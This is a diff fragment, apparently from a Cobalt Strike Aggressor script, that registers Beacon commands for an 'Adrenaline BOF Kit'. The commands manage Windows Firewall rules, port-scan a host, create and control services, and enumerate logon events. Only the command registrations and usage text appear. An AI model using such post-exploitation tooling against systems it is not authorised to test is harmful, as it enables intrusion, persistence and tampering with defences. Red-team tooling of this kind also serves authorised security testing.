+beacon_command_register("ad_firewall_rule", "Add, remove, query, or list Windows Firewall rules", "Usage: ad_firewall_rule <add|remove|query|list> <args...>\n  add <name> <in|out> <allow|block> <tcp|udp|any> [localport] [remoteport|profile] [profile]\n  remove <name>\n  query <name>\n  list");
+beacon_command_register("ad_port_scan", "Bounded IPv4 TCP/UDP port scan against one host", "Usage: ad_port_scan <target> [top20|top100|port|port-list|start-end] [protocol:0=tcp|1=udp|2=both] [timeout_ms]");
+beacon_command_register("ad_service_control", "Manage local Windows services through SCM", "Usage: ad_service_control query [service_name]\n  ad_service_control create <service_name> <bin_path> [display_name] [start_type] [service_type] [error_control]\n  ad_service_control start <service_name>\n  ad_service_control stop <service_name>\n  ad_service_control delete <service_name>\n  ad_service_control failure <service_name> <reset_seconds> [reboot_msg] [command] [actions]");
+beacon_command_register("ad_wevt_logon_enum", "Enumerate recent Security log logon events", "Usage: ad_wevt_logon_enum");
+
+println("Loaded Adrenaline BOF Kit aliases. Type ad_help in a Beacon console.");
